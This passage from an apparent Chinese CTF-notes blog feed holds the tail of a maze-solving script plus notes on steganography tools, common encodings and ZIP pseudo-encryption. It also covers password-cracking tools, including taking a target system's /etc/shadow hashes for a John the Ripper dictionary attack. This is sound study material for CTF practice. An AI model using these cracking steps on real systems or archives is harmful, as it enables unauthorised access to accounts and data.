punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'s'</span>  <span class="token comment">## 向下走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment">## 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">## 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment">## 可以往上走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'w'</span>  <span class="token comment">## 向上走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment">## 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">## 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment">## 可以往右走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'d'</span>  <span class="token comment">## 向右走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">## 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">## 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment">## 可以往左走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment">## 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'a'</span>  <span class="token comment">## 向左走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment">## 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">## 遇到死胡同，回退到标记的地方  </span>    dfs<span class="token punctuation">(</span>sti<span class="token punctuation">,</span> stj<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">总结了一些做逆向题时，编写脚本可能会用到的便捷算法，争取快人一步</summary>
    
    
    
    <category term="便捷算法" scheme="https://www.4ss1du0us.cn/categories/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="REVERSE" scheme="https://www.4ss1du0us.cn/tags/REVERSE/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>压缩包密码爆破</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</id>
    <published>2023-03-19T07:57:20.000Z</published>
    <updated>2023-04-14T08:52:06.675Z</updated>
    
    <content type="html"><![CDATA[<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><blockquote><p>一款常用的密码破解工具，可以用于暴力破解各种类型的加密密码</p></blockquote><ul><li><p>下载安装：<br>  <code>sudo apt-get install john</code></p></li><li><p>使用步骤：</p><ol><li>准备哈希文件<ul><li>使用 John 破解密码需要先获得<strong>目标系统的哈希文件</strong>。在 Linux 系统中，可以通过 <code>/etc/shadow</code> 文件获取哈希文件</li></ul></li><li>准备字典文件<ul><li>字典文件是用于猜测密码的文本文件，其中包含常见的单词、名字、生日等信息，可以自己制作，也可以网上下载</li></ul></li><li>运行 John<ul><li><code>john --wordlist=&lt;字典文件路径&gt; &lt;哈希文件路径&gt;</code></li><li>“–wordlist” 选项指定了要使用的字典文件，哈希文件路径为目标系统的哈希文件路径</li></ul></li></ol></li></ul><hr><h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><blockquote><p>fcrackzip 是一个用于暴力破解 ZIP 文件密码的命令行工具</p></blockquote><ul><li><p>下载安装：<br>  <code>sudo apt-get install fcrackzip</code></p></li><li><p>用法：<br>  <code>fcrackzip -b -c &#39;aA1!&#39; -l 1-10 -u &lt;zip文件名&gt;</code></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">-b</td><td align="left">代表 暴力破解</td></tr><tr><td align="left">-c</td><td align="left">指定使用的字符集</td></tr><tr><td align="left">-l</td><td align="left">限制密码长度</td></tr></tbody></table><hr><h2 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h2><blockquote><p>rarcrack 是一个用于暴力破解 RAR 文件密码的命令行工具</p></blockquote><ul><li><p>下载安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> rarcrack<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libxml2-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>用法：<br>  <code>rarcrack &lt;文件名&gt; --threads &lt;线程数&gt; --type &lt;rar/zip/7z&gt;</code></p></li></ul><hr>]]></content>
    
    
    <summary type="html">解压 ZIP 文件有时候会遇到真加密，但是没有告诉密码，就需要暴力破解密码了</summary>
    
    
    
    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>隐写</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E9%9A%90%E5%86%99/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E9%9A%90%E5%86%99/</id>
    <published>2023-03-19T07:57:08.000Z</published>
    <updated>2023-03-29T02:42:20.350Z</updated>
    
    <content type="html"><![CDATA[<h2 id="图像隐写"><a href="#图像隐写" class="headerlink" title="图像隐写"></a>图像隐写</h2><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><blockquote><p>分析文件里面包含的隐藏文件</p></blockquote><ul><li><code>binwalk &lt;文件名&gt;</code><br>  可直接扫描，通过扫描能够发现目标文件中包含的所有可识别的文件类型  </li><li><code>binwalk -e &lt;文件名&gt;</code><br>  扫描，-e（extract）自动提取出已知的文件类型</li></ul><hr><h3 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h3><blockquote><p>检测 png 和 bmp 图片里的隐写数据</p><p>安装：<code>sudo gem install zsteg</code></p></blockquote><ul><li><code>zsteg &lt;文件名&gt;</code><br>  查看 LSB 分析结果</li><li><code>zsteg &lt;文件名&gt; --all</code><br>  快速提取所有隐藏信息</li><li><code>zsteg -e &quot;偏移地址&quot; &lt;源文件名&gt; &gt; &lt;提取文件的文件名&gt;</code><br>  从某个文件的偏移地址处提取出隐藏文件</li></ul><hr><h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><blockquote><p>文件分离</p></blockquote><ul><li><code>foremost &lt;文件名&gt;</code><ol><li>会形成一个 output 文件夹，里面存放的是分离出来的文件</li><li>如果已经知道文件中包含了一个其他的文件类型，通过 <code>binwalk</code> 得到偏移地址，<mark>可以直接在 <code>WinHex</code> 中定位到该偏移地址，然后将文件的内容直接复制到一个新建的文件中，即可得到包含的文件</mark></li></ol></li></ul><hr><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><blockquote><p>打印文件中可打印字符串</p></blockquote><ul><li><code>strings &lt;文件名&gt;</code><br>  将文件中包含的可打印字符串输出出来（有点类似于 IDA 里的 shift + F12 查看字符串）</li><li><code>strings &lt;文件名&gt; | grep flag</code><br>  仅输出文件中包含 “flag” 的字符串</li></ul><hr><h3 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h3><blockquote><p>一个 jar 包，轻量级的图片隐写工具（首先需安装好 java 环境）</p></blockquote><ul><li>下载地址：<a href="http://www.caesum.com/handbook/Stegsolve.jar">Stegsolve.jar（win&#x2F;linux）</a></li><li>安装 <a href="https://www.oracle.com/java/technologies/downloads/#java8-windows">java jdk</a>环境，用 <code>java -version</code> 验证安装是否成功</li><li>打开运行：<br>  <code>java -jar &lt;Stegsolve.jar 所在路径&gt;</code></li></ul><hr><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><blockquote><p>Audacity 是一款音频编辑软件，可以查看音频的频率、波谱等，有时候会隐藏信息</p><p>音频分析软件 Audacity 下载地址：<a href="https://www.audacityteam.org/">Audacity ® | Free</a></p></blockquote><hr><h3 id="DeepSound"><a href="#DeepSound" class="headerlink" title="DeepSound"></a>DeepSound</h3><blockquote><p>DeepSound 是一种隐写术工具，可以将隐藏的消息或文件嵌入到音频中</p><p>音频隐写软件 DeepSound 下载地址：<a href="http://www.jpinsoft.net/deepsound/download.aspx">DeepSound -&gt; Download</a></p></blockquote>]]></content>
    
    
    <summary type="html">杂项中关于隐写的一点总结，帮助快速入门各类隐写</summary>
    
    
    
    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>各种加密算法</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/</id>
    <published>2023-03-19T07:56:58.000Z</published>
    <updated>2023-03-29T02:42:17.866Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Base-家族"><a href="#Base-家族" class="headerlink" title="Base 家族"></a>Base 家族</h2><blockquote><p><strong>不同的 Base 系列编码主要区别在于：编码所用到的字符数量不同</strong></p></blockquote><hr><h3 id="自动化工具（BaseCrack）"><a href="#自动化工具（BaseCrack）" class="headerlink" title="自动化工具（BaseCrack）"></a>自动化工具（BaseCrack）</h3><blockquote><p>在 <code>BaseCrack</code> 的帮助下，可以自动识别出 Base 系列的加密，并且还可以一次性对任意模式下的多重 Base 编码数据进行解码</p><p>BaseCrack 下载地址：<a href="https://github.com/mufeedvh/basecrack">basecrack</a><br>安装依赖文件：<code>pip3 install -r requirements.txt</code><br>运行：<code>python basecrack.py</code></p></blockquote><hr><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><blockquote><p>64 &#x3D; $2 ^ {6}$，每 6bit 为一个单元， 使用 <code>64 个 ASCii 可打印字符</code>（字母 A-Z、字母 a-z、数字 0-9 和 ‘+’、’&#x2F;‘）</p></blockquote><ul><li>码表：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> （另外，<code>&#39;=&#39;</code> 用作填充）</li><li><strong>经过 Base64 编码后的字符串长度一定会被4整除（长度包括后缀等号）</strong></li><li>由于 8bit 数据按照 6bit 切分不一定整除，末尾可能会出现 1 或 2 个  <code>&#39;=&#39;</code>，但 <code>&#39;=&#39;</code> 不超过两个</li></ul><hr><h3 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a>Base16</h3><blockquote><p>16 &#x3D; $2 ^ {4}$，每 4bit 为一个单元，使用 <code>16 个 ASCii 可打印字符</code>（字母 A-F、数字 0-9）</p></blockquote><ul><li>由于 8bit 数据按照 4bit 切分刚好是 2 组，所以 Base16 不可能用到填充符号 <code>&#39;=&#39;</code></li></ul><hr><h3 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h3><blockquote><p>32 &#x3D; $2 ^ {5}$，每 5bit 为一个单元，使用 <code>32 个 ASCii 可打印字符</code>（字母 A-Z、数字 2-7）</p></blockquote><hr><h3 id="base36"><a href="#base36" class="headerlink" title="base36"></a>base36</h3><blockquote><p>使用 <code>36 个 ASCii 可打印字符</code>（数字 0-9，26 个字母：A-Z 或 a-z）</p></blockquote><ul><li>加密仅支持整数数字，解密仅支持字符串，不支持中文</li></ul><hr><h3 id="Base58"><a href="#Base58" class="headerlink" title="Base58"></a>Base58</h3><blockquote><p>使用 <code>58 个 ASCii 可打印字符</code>（Base64 除去数字 <code>&#39;0&#39;</code>，大写字母 <code>&#39;O&#39;</code>、<code>&#39;I&#39;</code>，小写字母 <code>&#39;l&#39;</code>，和 <code>&#39;+&#39;</code>、 <code>&#39;/&#39;</code>）</p></blockquote><hr><h3 id="Base62"><a href="#Base62" class="headerlink" title="Base62"></a>Base62</h3><blockquote><p>使用 <code>62 个 ASCii 可打印字符</code>（数字 0-9、字母 A-Z 和字母 a-z）</p></blockquote><hr><h3 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a>Base91</h3><blockquote><p>使用 <code>91 个 ASCii 可打印字符</code>，从 ASCii 字符（0x21 - 0x7E）中除 <code>-</code>（0x2D）、<code>\</code>（0x5C）、<code>&#39;</code>（0x27）外的其他 91 个可打印字符组成</p></blockquote><hr><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><blockquote><p>MD5 值是 <code>32位</code> 由数字 0-9，字母 a-f 组成的字符串（<code>也有可能是 16 位</code>）</p></blockquote><ul><li>MD5 散列结果是 128bit 固定长度的二进制数据，然后将每 4 个二进制数据转化为 1 个十六进制数据，因此，128 位二进制数据转化为 32 个十六进制数据（128 &#x2F; 4 &#x3D; 32），最终以字符串形式呈现</li></ul><hr><h2 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h2><blockquote><p>URL 编码中只允许包含英文字母、数字、4 个特殊字符：<code>- _ . ~</code> 和所有的保留字符：<code>！ * ’ ( ) ; : @ &amp; = + $ , / ? # [ ]</code></p></blockquote><ul><li>URL 编码后的字符串中含有一些特殊的字符，比如 <code>&#39;%&#39;</code>、<code>&#39;+&#39;</code> 等，</li></ul><hr><h2 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h2><blockquote><p>Brainfuck 是一种极简单的编程语言，它只包含 8 个命令字符，并且没有任何高级语言的概念，比如函数、变量等</p></blockquote><table><thead><tr><th align="left">字符</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>&gt;</code></td><td align="left">移动指针到向右一个内存单元</td></tr><tr><td align="left"><code>&lt;</code></td><td align="left">移动指针到向左一个内存单元</td></tr><tr><td align="left"><code>+</code></td><td align="left">将当前内存单元加 1</td></tr><tr><td align="left"><code>-</code></td><td align="left">将当前内存单元减 1</td></tr><tr><td align="left"><code>.</code></td><td align="left">输出当前内存单元的值</td></tr><tr><td align="left"><code>,</code></td><td align="left">从输入读入一个字符，并将其赋值给当前内存单元</td></tr><tr><td align="left"><code>[</code></td><td align="left">如果当前内存单元的值为 0，则跳转到对应的 <code>]</code> 之后</td></tr><tr><td align="left"><code>]</code></td><td align="left">如果当前内存单元的值不为 0，则跳转到对应的 <code>[</code> 之前</td></tr></tbody></table><ul><li>用 <code>&#39;&gt;&#39;</code>、<code>&#39;&lt;&#39;</code>、<code>&#39;+&#39;</code>、<code>&#39;-&#39;</code>、<code>&#39;.&#39;</code>、<code>&#39;,&#39;</code>、<code>&#39;[&#39;</code>、<code>&#39;]&#39;</code> 八种符号组成</li><li>例如：<br>  明文 Hello World!，加密后密文为：<code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</code></li></ul><hr><h2 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h2><blockquote><p>Ook! 是 Brainfuck 的一种变体，它同样只包含 8 个命令字符，但是两两成对，每对命令字符组成一个 “Ook” 单元</p></blockquote><table><thead><tr><th align="left">符号</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>Ook? Ook.</code></td><td align="left">移动指针到向右一个内存单元</td></tr><tr><td align="left"><code>Ook. Ook?</code></td><td align="left">移动指针到向左一个内存单元</td></tr><tr><td align="left"><code>Ook. Ook.</code></td><td align="left">将当前内存单元加 1</td></tr><tr><td align="left"><code>Ook! Ook!</code></td><td align="left">将当前内存单元减 1</td></tr><tr><td align="left"><code>Ook! Ook.</code></td><td align="left">输出当前内存单元的值</td></tr><tr><td align="left"><code>Ook. Ook!</code></td><td align="left">从输入读入一个字符，并将其赋值给当前内存单元</td></tr><tr><td align="left"><code>Ook! Ook?</code></td><td align="left">如果当前内存单元的值为 0，则跳转到对应的 <code>Ook? Ook!</code> 之后</td></tr><tr><td align="left"><code>Ook? Ook!</code></td><td align="left">如果当前内存单元的值不为 0，则跳转到对应的 <code>Ook! Ook?</code> 之前</td></tr></tbody></table><ul><li>Ook! 和 Brainfuck 的主要区别在于其命令字符是成对出现的，以及 Ook! 的输出是单个字符，而不是 ASCii 码</li><li>特点是字符串中存在很多 <code>&#39;.&#39;</code>、<code>&#39;!&#39;</code>、<code>&#39;?&#39;</code> 符号</li></ul><hr><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><blockquote><p>凯撒密码一般适用于 26 个英文字母，根据对字符串中的字符进行移位来实现加密</p><p>例如，当偏移量为 3 时，A 被替换成 D，B 被替换成 E，Z 被替换成 C</p></blockquote><hr><h2 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h2><blockquote><p>Rabbit 加密开头部分通常为：<code>U2FsdGVkX1</code></p></blockquote><ul><li>明显密文里​​ <code>&#39;+&#39;</code> 比较多，并且经常有 <code>&#39;/&#39;</code></li><li>例如：<br>  明文 “I Love You 521”，无密钥，加密后密文为：<strong>U2FsdGVkX1</strong>9DvuEo5PvBA8TuLrM2t+EZBvUkzlAa<br>  明文 “I Love You 521”，密钥为 666，加密后密文为：<strong>U2FsdGVkX1</strong>8w6vxXxux&#x2F;ivRVwo3xMzTxmUyk7cHz</li></ul><hr><h2 id="兽语编码"><a href="#兽语编码" class="headerlink" title="兽语编码"></a>兽语编码</h2><blockquote><p>用动物的拟声词或语气词作为加密内容</p></blockquote><ul><li>例如：<br>  明文 “我喜欢你”，加密后密文为：<del>呜嗷呜啊嗷</del>嗷<del>呜嗷啊呜啊啊<del>嗷</del>啊呜嗷</del>嗷<del>呜嗷嗷</del>嗷呜嗷~~啊</li></ul><hr><h2 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h2><blockquote><p>摩斯密码使用点 <code>&#39;.&#39;</code> 和划线 <code>&#39;-&#39;</code> 两种符号表示摩斯电码中的点和线</p></blockquote><ul><li>有时会出现在杂项的音频隐写中，一般在波谱中，用较宽的代表 <code>&#39;-&#39;</code>，用较窄的代表 <code>&#39;.&#39;</code>，而中间的间隔代表 <code>&#39;/&#39;</code></li></ul><p><img src="https://s2.loli.net/2023/03/28/sQmZdYy8Fz61hWb.png" alt="各种加密方法的特点_摩斯密码1.png"></p><hr>]]></content>
    
    
    <summary type="html">对常见的一些加密算法的简单汇总，杂项中有时会遇到，有备无患</summary>
    
    
    
    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>ZIP伪加密</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
    <id>https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</id>
    <published>2023-03-19T07:56:39.000Z</published>
    <updated>2023-04-14T08:52:18.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ZIP-伪加密原理"><a href="#ZIP-伪加密原理" class="headerlink" title="ZIP 伪加密原理"></a>ZIP 伪加密原理</h2><blockquote><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时被识别为加密压缩包</p></blockquote><hr><h2 id="自动化识别工具"><a href="#自动化识别工具" class="headerlink" title="自动化识别工具"></a>自动化识别工具</h2><h3 id="ZipCenOp"><a href="#ZipCenOp" class="headerlink" title="ZipCenOp"></a>ZipCenOp</h3><blockquote><p>ZipCenOp 是一个 jar 包，用于操作 zip 格式的压缩文件，还支持对 zip 文件进行密码保护，也可以用于识别 zip 文件是否是伪加密</p><p>下载安装：<a href="https://github.com/442048209as/ZipCenOp/releases/tag/1.0">Release 1.0 · 442048209as&#x2F;ZipCenOp</a></p></blockquote><ul><li>使用：<br>  <code>java -jar ZipCenOp.jar r &lt;zip 文件名&gt;</code></li></ul><hr><h3 id="WinRAR"><a href="#WinRAR" class="headerlink" title="WinRAR"></a>WinRAR</h3><blockquote><p>一个解压软件，随缘吧，不一定行</p></blockquote><ul><li>进入 “工具”，修复压缩文件</li></ul><hr><h2 id="ZIP-文件的结构"><a href="#ZIP-文件的结构" class="headerlink" title="ZIP 文件的结构"></a>ZIP 文件的结构</h2><blockquote><p>一个 ZIP 文件由三个部分组成</p></blockquote><h3 id="数据区"><a href="#数据区" class="headerlink" title="数据区"></a>数据区</h3><p><mark>50 4B 03 04：这是头文件标记（0x04034b50）</mark><br>14 00：解压文件所需 pkware 版本<br><mark>09 00：全局方式位标记（有无加密）</mark><br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 64：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>00 00：扩展记录长度</p><h3 id="目录区"><a href="#目录区" class="headerlink" title="目录区"></a>目录区</h3><p><mark>50 4B 01 02：目录中文件文件头标记(0x02014b50)</mark><br>1F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><mark>09 00：全局方式位标记（有无加密，<em><strong>更改这里进行伪加密</strong></em>，改为09 00打开就会提示有密码了）</mark><br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 65：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p><h3 id="目录结束标志"><a href="#目录结束标志" class="headerlink" title="目录结束标志"></a>目录结束标志</h3><p><mark>50 4B 05 06：目录结束标记</mark><br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>5A 00 00 00：目录区尺寸大小<br>3F 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 00：ZIP 文件注释长度</p><hr><h2 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h2><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>00 00</td></tr></tbody></table><hr><h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table><hr><h2 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h2><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>09 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table><hr><h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2><table><thead><tr><th>加解密</th><th>方法</th></tr></thead><tbody><tr><td>去除密码</td><td><mark><strong>压缩源文件目录区 的 全局方式位标记 的 01 00 或 09 00 改为 00 00</strong></mark></td></tr><tr><td>添加密码提示</td><td>压缩源文件目录区 的 全局方式位标记 的 00 00 改为 01 00 或 09 00</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">解压 ZIP 的时候弹出加密提醒，有时并不一定是真的加密了</summary>
    
    
    
    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>GIF图片拆分&amp;拼图</title>
    <link href="https://www.4ss1du0us.cn/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86&amp;%E6%8B%BC%E5%9B%BE/"/>
